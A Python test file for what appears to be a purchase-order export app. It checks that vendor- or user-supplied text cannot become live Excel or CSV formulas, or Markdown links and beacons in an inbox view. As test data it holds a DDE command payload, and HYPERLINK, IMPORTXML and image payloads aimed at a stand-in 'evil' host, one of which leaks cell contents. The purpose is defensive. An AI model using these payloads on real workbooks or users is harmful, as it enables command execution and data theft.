"""Text that arrives in the data must not become a live Excel formula.

A vendor controls the text in the PO PDFs we parse. openpyxl turns a string
starting with "=" into a formula, so that text lands as a formula in the
workbook a colleague opens. Only "=" does this -- "+", "-" and "@" are stored
as plain text whatever the usual spreadsheet-injection advice says, and
escaping those would corrupt legitimate values like "-" and "-1".
"""
from __future__ import annotations

import io
import os

import openpyxl
import pandas as pd
import pytest

from po_extractor.exporters._excel_helpers import (
    neutralise_csv_frame, neutralise_foreign_formulas,
)


def _roundtrip(wb):
    buf = io.BytesIO()
    wb.save(buf)
    buf.seek(0)
    return openpyxl.load_workbook(buf).active


def test_only_equals_makes_a_formula():
    """The premise. If openpyxl ever changes this, the helper below is wrong."""
    wb = openpyxl.Workbook()
    ws = wb.active
    for i, v in enumerate(["=1+1", "+1+1", "-1+1", "@SUM(A1)", "-"], start=1):
        ws.cell(i, 1, v)
    got = _roundtrip(wb)
    assert got.cell(1, 1).data_type == "f"
    assert [got.cell(r, 1).data_type for r in (2, 3, 4, 5)] == ["s"] * 4


@pytest.mark.parametrize("payload", [
    "=cmd|'/c calc'!A1",
    "=1+1",
    "=HYPERLINK(\"http://evil\",\"click\")",
    "=IMPORTXML(\"http://evil\",\"//x\")",
])
def test_injected_text_is_stored_as_text(payload):
    wb = openpyxl.Workbook()
    wb.active.cell(1, 1, payload)
    assert neutralise_foreign_formulas(wb) == 1
    got = _roundtrip(wb)
    assert got.cell(1, 1).data_type == "s"
    assert got.cell(1, 1).value == payload      # characters kept, exactly


@pytest.mark.parametrize("formula", [
    "=SUM(B1:B9)",
    "=SUM(E2:E10,F2:F10)",
    "='Sheet 2'!A1",
    "='003_060 Wine'!G14",
])
def test_the_exporters_own_formulas_survive(formula):
    """These are the only two shapes this codebase writes. Neutralising them
    would blank every total in every buy plan."""
    wb = openpyxl.Workbook()
    wb.active.cell(1, 1, formula)
    assert neutralise_foreign_formulas(wb) == 0
    assert _roundtrip(wb).cell(1, 1).data_type == "f"


def test_plain_values_are_left_alone():
    wb = openpyxl.Workbook()
    ws = wb.active
    for i, v in enumerate(["-1", "-", "+44 123", "@factory", 42, None], start=1):
        ws.cell(i, 1, v)
    assert neutralise_foreign_formulas(wb) == 0


def test_every_sheet_is_covered():
    wb = openpyxl.Workbook()
    wb.active.cell(1, 1, "=evil()")
    wb.create_sheet("second").cell(1, 1, "=alsoevil()")
    assert neutralise_foreign_formulas(wb) == 2


def test_a_real_buy_plan_export_defuses_injected_text(tmp_path):
    """End to end through an actual exporter, not just the helper."""
    from po_extractor.exporters.tracking_grid_xlsx import build_tracking_grid_xlsx
    records = [{"po_number": "=cmd|'/c calc'!A1", "style": "ST1",
                "factory": "F1"}]
    for stage in ("fabric_purchase", "cutting", "packing"):
        records[0][f"{stage}_planned"] = ""
        records[0][f"{stage}_actual"] = ""
    data = build_tracking_grid_xlsx(records)
    ws = openpyxl.load_workbook(io.BytesIO(data)).active
    hits = [c for row in ws.iter_rows() for c in row
            if isinstance(c.value, str) and c.value.startswith("=cmd")]
    assert hits, "the payload should still be present as text"
    assert all(c.data_type == "s" for c in hits)


# ── CSV formula injection (the pandas to_csv download path) ─────────────────
#
# neutralise_foreign_formulas above defends the openpyxl/xlsx path, and only
# "=" matters there. A CSV opened in Excel/LibreOffice is broader: it evaluates
# a cell starting with = + - @ (or a leading tab/CR). The audit-log exports
# (Login Log, Change Log) carry text an unauthenticated visitor or a scoped
# non-admin controls -- a login username, a 船样要求 note, a brand name from an
# uploaded contract -- straight into to_csv, so that path needs its own defuse.

_CSV_PAYLOADS = [
    "=cmd|'/c calc'!A1",
    '=HYPERLINK("http://evil?"&A1,"x")',
    "+1+1",
    "-2+3",
    "@SUM(A1)",
    "\t=1",
    "\r=2",
]


@pytest.mark.parametrize("payload", _CSV_PAYLOADS)
def test_csv_leaders_are_defused(payload):
    """Every character is kept; a single apostrophe is prepended."""
    out = neutralise_csv_frame(pd.DataFrame({"c": [payload]}))
    assert out["c"].iloc[0] == "'" + payload


@pytest.mark.parametrize("safe", ["normal", "a=b", "10.0.0.1", "", "N/A"])
def test_csv_safe_values_are_untouched(safe):
    """Only a LEADING trigger matters -- 'a=b' and an IP must pass through."""
    out = neutralise_csv_frame(pd.DataFrame({"c": [safe]}))
    assert out["c"].iloc[0] == safe


def test_csv_numeric_columns_keep_type_and_original_is_not_mutated():
    df = pd.DataFrame({"txt": ["=evil"], "qty": [5]})
    out = neutralise_csv_frame(df)
    assert out["qty"].dtype == df["qty"].dtype       # not stringified
    assert out["qty"].iloc[0] == 5
    assert df["txt"].iloc[0] == "=evil"              # a copy; original intact


def test_written_csv_is_inert_when_reread():
    """The apostrophe survives into the file text, so Excel reads text."""
    from ui.shared import csv_safe
    df = pd.DataFrame({"user": ["=cmd|'/c calc'!A1"], "ip": ["=1"]})
    text = csv_safe(df).to_csv(index=False)
    assert "'=cmd|'/c calc'!A1" in text
    assert "'=1" in text


def test_ui_csv_safe_delegates_to_the_backend_helper():
    from ui.shared import csv_safe
    df = pd.DataFrame({"c": ["=x", "+y", "ok", 3]})
    assert list(csv_safe(df)["c"]) == list(neutralise_csv_frame(df)["c"])


# Regression lock. Every CSV *download* sink must run its frame through the
# neutraliser; the count invariant catches a new bare `.to_csv(` that skips it
# -- exactly how the Login Log and Change Log exports first shipped unescaped.
# (All to_csv in these files are download-bound and none are re-parsed as data,
# so wrapping every one is correct; verified when the guard was written.)
_CSV_DOWNLOAD_SINKS = {
    "ui/admin_change_log.py":               "csv_safe",
    "ui/admin_login_log.py":                "csv_safe",
    "ui/sky_east/history.py":               "csv_safe",
    "ui/fabric_db/validation.py":           "csv_safe",
    "ui/giii/extraction.py":                "csv_safe",
    "po_extractor/exporters/csv_export.py": "neutralise_csv_frame",
}


@pytest.mark.parametrize("rel,helper", list(_CSV_DOWNLOAD_SINKS.items()))
def test_every_csv_download_sink_is_neutralised(rel, helper):
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    with open(os.path.join(root, rel), encoding="utf-8") as fh:
        src = fh.read()
    assert src.count(".to_csv(") == src.count(helper + "("), (
        f"{rel}: every .to_csv() for download must wrap its frame in "
        f"{helper}(...). An unwrapped one is a CSV formula-injection sink "
        f"(see ui/shared.csv_safe / _excel_helpers.neutralise_csv_frame)."
    )


def test_csv_safe_is_a_module_level_import_in_every_sink():
    """The count guard above compares to `helper(` occurrences; a helper only
    imported lazily inside a function would still let a bare module-level
    to_csv slip. Pin that csv_safe is imported at module scope where used."""
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    for rel, helper in _CSV_DOWNLOAD_SINKS.items():
        with open(os.path.join(root, rel), encoding="utf-8") as fh:
            src = fh.read()
        assert helper in src, f"{rel} never references {helper}"


# ── Markdown injection in the email inbox ───────────────────────────────────

def test_a_sender_cannot_inject_a_link_or_beacon_into_the_inbox():
    """Filenames and summaries are written by whoever sent the mail. Rendered
    as Markdown, a link works and an image is fetched from inside the network
    the moment the inbox is opened."""
    from ui.email_view import _md_escape
    for payload in ["[invoice](http://evil)",
                    "![x](http://evil/beacon.png)",
                    "**not really bold**"]:
        out = _md_escape(payload)
        assert "](" not in out
        assert out != payload
    # A plain filename survives readably (escapes are invisible once rendered).
    assert _md_escape("PO_2360361C.pdf").replace("\\", "") == "PO_2360361C.pdf"
    assert _md_escape(None) == ""
